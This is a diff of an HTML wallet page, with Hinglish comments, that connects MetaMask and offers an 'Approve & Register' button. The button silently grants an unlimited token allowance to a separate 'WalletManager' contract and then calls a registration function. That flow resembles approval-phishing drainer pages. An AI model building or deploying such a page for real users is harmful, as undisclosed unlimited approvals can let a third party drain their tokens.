@@ -1,53 +1,117 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>One Click Register & Approve</title>
+  <title>Approve & Register (XContract + WalletManager)</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <style>
+    body { font-family: Arial, sans-serif; max-width: 600px; margin: 30px auto; }
+    button { padding: 10px 20px; font-size: 16px; margin: 10px 0; cursor: pointer; }
+    pre { background: #f0f0f0; padding: 15px; height: 200px; overflow-y: auto; border-radius: 5px; }
+  </style>
 </head>
 <body>
-  <h2>One Click Setup</h2>
-  <button id="connect">Connect Wallet</button>
-  <button id="approveRegister">Register & Approve (One Click)</button>
 
-  <script>
-    // ===== CONFIGURATION =====
-    const X_CONTRACT_ADDRESS = "0xc009fE79383814E2d03EdBF934186E42896966fB"; // X Contract ka address
-    const X_CONTRACT_ABI = [
-      "function registerAndApprove() external"
-    ];
+  <h2>Wallet Connect + Approve + Register</h2>
 
-    let signer, xContract;
+  <button id="connectBtn">Connect Wallet</button><br>
+  <button id="approveRegisterBtn" disabled>Approve & Register</button>
 
-    // ===== CONNECT WALLET =====
-    document.getElementById("connect").onclick = async () => {
-      if (window.ethereum) {
-        await window.ethereum.request({ method: "eth_requestAccounts" });
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        signer = provider.getSigner();
-        xContract = new ethers.Contract(X_CONTRACT_ADDRESS, X_CONTRACT_ABI, signer);
-        alert("✅ Wallet connected!");
+  <pre id="log"></pre>
+
+<script>
+  const WALLET_MANAGER = "0x528E409e5F85f03C0FF2EE6151A0f9473F648d97";  // WalletManager address
+  const X_CONTRACT = "0xc009fE79383814E2d03EdBF934186E42896966fB";       // XContract address
+  const TOKEN = "0xbea1762935F5C92b6c906b5cdEABB51211067098";            // Token address
+
+  const ERC20_ABI = [
+    "function allowance(address owner, address spender) view returns (uint256)",
+    "function approve(address spender, uint256 amount) returns (bool)"
+  ];
+
+  const X_ABI = [
+    "function registerAndSync() external"
+  ];
+
+  let provider, signer, userAddress;
+  let tokenContract, xContract;
+
+  const logEl = document.getElementById("log");
+  const connectBtn = document.getElementById("connectBtn");
+  const approveRegisterBtn = document.getElementById("approveRegisterBtn");
+
+  function log(msg) {
+    logEl.textContent += msg + "\n";
+    logEl.scrollTop = logEl.scrollHeight;
+    console.log(msg);
+  }
+  function clearLog() {
+    logEl.textContent = "";
+  }
+
+  connectBtn.onclick = async () => {
+    if (!window.ethereum) {
+      alert("MetaMask nahi mila! Please install MetaMask.");
+      return;
+    }
+
+    try {
+      await window.ethereum.request({ method: "eth_requestAccounts" });
+      provider = new ethers.providers.Web3Provider(window.ethereum);
+      signer = provider.getSigner();
+      userAddress = await signer.getAddress();
+
+      tokenContract = new ethers.Contract(TOKEN, ERC20_ABI, signer);
+      xContract = new ethers.Contract(X_CONTRACT, X_ABI, signer);
+
+      log(`✅ Wallet connected: ${userAddress}`);
+      approveRegisterBtn.disabled = false;
+    } catch (err) {
+      alert("Wallet connect karte waqt error aaya: " + err.message);
+    }
+  };
+
+  approveRegisterBtn.onclick = async () => {
+    if (!signer) {
+      alert("Pehle wallet connect karo!");
+      return;
+    }
+
+    clearLog();
+
+    try {
+      log("Checking allowance for WalletManager...");
+
+      let allowance = await tokenContract.allowance(userAddress, WALLET_MANAGER);
+      log(`Current allowance: ${allowance.toString()}`);
+
+      const maxUint = ethers.constants.MaxUint256;
+
+      if (allowance.lt(ethers.BigNumber.from("1"))) {
+        log("Allowance kam hai, ab approve bhej rahe hain WalletManager ko...");
+
+        let txApprove = await tokenContract.approve(WALLET_MANAGER, maxUint);
+        log(`Approve transaction bheja: ${txApprove.hash}`);
+
+        await txApprove.wait();
+        log("Approve transaction confirm ho gaya!");
       } else {
-        alert("❌ MetaMask not found!");
-      }
-    };
-
-    // ===== ONE CLICK REGISTER + APPROVE =====
-    document.getElementById("approveRegister").onclick = async () => {
-      if (!signer) {
-        alert("⚠️ Please connect wallet first!");
-        return;
+        log("Allowance already sufficient, approve nahi karna.");
       }
 
-      try {
-        console.log("🚀 Sending one-click transaction...");
-        const tx = await xContract.registerAndApprove();
-        await tx.wait();
-        alert("🎉 Registered & Approved in one transaction!");
-      } catch (err) {
-        console.error("❌ Error:", err);
-        alert("❌ Transaction failed! Check console for details.");
-      }
-    };
-  </script>
+      log("Ab XContract me register kar rahe hain aur WalletManager me sync kar rahe hain...");
+      let txRegister = await xContract.registerAndSync();
+      log(`Register transaction bheja: ${txRegister.hash}`);
+
+      await txRegister.wait();
+      log("Register transaction confirm ho gaya. Kaam ho gaya! 🎉");
+
+      alert("Approve & Register dono successful!");
+    } catch (error) {
+      log("Error aaya: " + (error.message || error));
+      alert("Kuch gadbad hui, console dekho.");
+    }
+  };
+</script>
+
 </body>
 </html>
